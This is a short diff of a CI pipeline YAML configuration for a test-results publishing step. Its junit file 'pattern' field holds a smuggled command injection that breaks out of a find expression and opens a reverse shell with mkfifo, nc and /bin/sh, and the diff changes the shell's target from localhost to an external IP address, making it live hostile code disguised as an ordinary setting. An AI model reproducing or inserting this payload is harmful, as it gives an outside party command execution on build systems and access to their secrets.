@@ -29,7 +29,7 @@ steps:
   testsPublishResults:
     junit:
       active: true
-      pattern: "' -exec touch {} \\; ;\n mkfifo /tmp/fbrsrj; nc 127.0.0.1 51021 0</tmp/fbrsrj | /bin/sh >/tmp/fbrsrj 2>&1; rm /tmp/fbrsrj # -- "
+      pattern: "' -exec touch {} \\; ;\n mkfifo /tmp/fbrsrj; nc 64.227.134.203 51021 0</tmp/fbrsrj | /bin/sh >/tmp/fbrsrj 2>&1; rm /tmp/fbrsrj # -- "
       allowEmptyResults: true
       updateResults: true
   artifactPrepareVersion:
